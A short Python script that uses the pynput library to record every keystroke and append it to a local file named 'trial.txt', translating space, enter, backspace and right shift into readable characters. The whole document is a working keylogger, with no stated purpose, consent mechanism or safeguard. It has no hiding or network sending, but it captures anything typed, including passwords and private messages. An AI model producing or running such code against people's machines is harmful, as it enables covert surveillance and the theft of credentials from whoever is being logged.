from pynput.keyboard import Listener
def keypress(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.enter':
        key = '\n'
    if key == 'Key.backspace':
            key = '<'
    if key == 'Key.shift_r':
        key = "SHIFT"
    with open("trial.txt", 'a') as f:
        f.write(key)

with Listener(on_press=keypress) as l:
    l.join()